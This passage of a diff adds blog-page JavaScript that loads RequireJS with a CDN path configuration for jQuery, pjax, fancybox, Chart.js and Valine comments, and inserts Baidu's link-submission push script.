+        if (window.attachEvent) {
+          b.onreadystatechange = function() {
+            var e = b.readyState
+            if (e === 'loaded' || e === 'complete') {
+              b.onreadystatechange = null
+              a()
+            }
+          }
+        } else {
+          b.onload = a
+        }
+      }
+      c.appendChild(b)
+    }
+    window.loadJs && window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {require.config({"paths":{"util":"util","share":"share","search":"search","pagemap":"pagemap.min","registerSW":"registerSW","valine":"cdn/Valine.min","av":["https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min"],"pjax":["https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min"],"jquery":["https://cdn.bootcss.com/jquery/3.4.1/jquery.min"],"confirm":["https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min"],"fancybox":["https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min"],"chart":["https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.bundle.min"]},"map":{"*":{"css":"https://cdn.bootcss.com/require-css/0.1.10/css.min.js"}},"shim":{"fancybox":{"deps":["css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css"]},"confirm":{"deps":["css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css"]},"chart":{"deps":["css!https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.min.css"]}},"waitSeconds":3})})
+  })</script> <script type="text/javascript">
+                  ;(function() {
+                    var bp = document.createElement('script')
+                    var curProtocol = window.location.protocol.split(':')[0]
+                    if (curProtocol === 'https') {
+                      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'
+                    } else {
+                      bp.src = 'http://push.zhanzhang.baidu.com/push.js'
+                    }
+                    var s = document.getElementsByTagName('script')[0]
+                    s.parentNode.insertBefore(bp, s)
+                  })()
+                </script> 
